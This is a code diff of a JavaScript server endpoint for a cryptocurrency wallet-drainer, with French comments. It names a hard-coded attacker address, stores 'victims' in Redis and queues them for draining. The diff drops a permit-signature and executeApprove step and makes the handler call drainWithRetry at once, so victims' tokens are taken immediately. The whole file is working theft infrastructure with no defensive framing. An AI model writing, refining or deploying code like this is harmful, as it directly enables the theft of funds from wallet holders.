@@ -3,13 +3,6 @@ import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const PERMIT_DRAIN_ADDRESS = '0x09eD2fa44a5841f9182A2C55C5F4cB978D619ECF'; // ← Ton adresse actuelle (simplifiée)
-const PERMIT_DRAIN_ABI = [
-  'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
-  'function nonces(address) view returns (uint256)'
-];
-
-// RPC fiable
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
@@ -31,7 +24,7 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
+    const { victim, chain, adminSecret } = req.body;
 
     // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
@@ -68,48 +61,12 @@ export default async function handler(req, res) {
       }
     }
 
-    // --- FLUX NORMAL : signature + executeApprove ---
-    if (!victim || !signature || !deadline || !token || !spender || !amount)
-      return res.status(400).json({ error: 'Paramètres manquants' });
+    // --- FLUX NORMAL : transaction déjà envoyée par le bridge → simple enregistrement + drain ---
+    if (!victim) return res.status(400).json({ error: 'Paramètre victim manquant' });
 
-    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+    const targetChain = chain || '1';
 
-    try {
-      // Vérification de la signature
-      const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
-      const nonce = await permitContractRead.nonces(victim);
-      const structHash = ethers.utils.solidityKeccak256(
-        ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
-        [victim, token, spender, amount, deadline, nonce]
-      );
-      const recoveredAddress = ethers.utils.verifyMessage(
-        ethers.utils.arrayify(structHash),
-        signature
-      );
-      if (recoveredAddress.toLowerCase() !== victim.toLowerCase()) {
-        return res.status(400).json({ error: 'Signature invalide' });
-      }
-
-      // Exécuter l'approve (ce contrat DOIT avoir le reset pour USDT, donc ça plantera ici si pas de reset)
-      const signer = wallet.connect(provider);
-      const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
-      const tx = await permitContractWrite.executeApprove(
-        victim,
-        token,
-        spender,
-        amount,
-        deadline,
-        signature,
-        { gasLimit: 300000 }
-      );
-      const receipt = await tx.wait();
-      console.log('✅ Approve exécuté, tx:', receipt.transactionHash);
-    } catch (err) {
-      console.error('❌ Échec approve:', err.message);
-      return res.status(500).json({ error: 'Échec de l’approve' });
-    }
-
-    // Mise en queue pour le drain
+    // Enregistrer la victime
     const client = createClient({ url: process.env.REDIS_URL });
     try {
       await client.connect();
@@ -119,12 +76,18 @@ export default async function handler(req, res) {
         parsedList.push(victim);
         await client.set('victims:list', JSON.stringify(parsedList));
       }
-      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
+      await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
     } finally {
       await client.disconnect();
     }
 
-    return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
+    // Déclencher immédiatement le drain
+    const success = await drainWithRetry(victim, targetChain);
+    if (success) {
+      return res.status(200).json({ success: true, victim, chain: targetChain });
+    } else {
+      return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+    }
   } else {
     return res.status(405).json({ error: 'Méthode non autorisée' });
   }
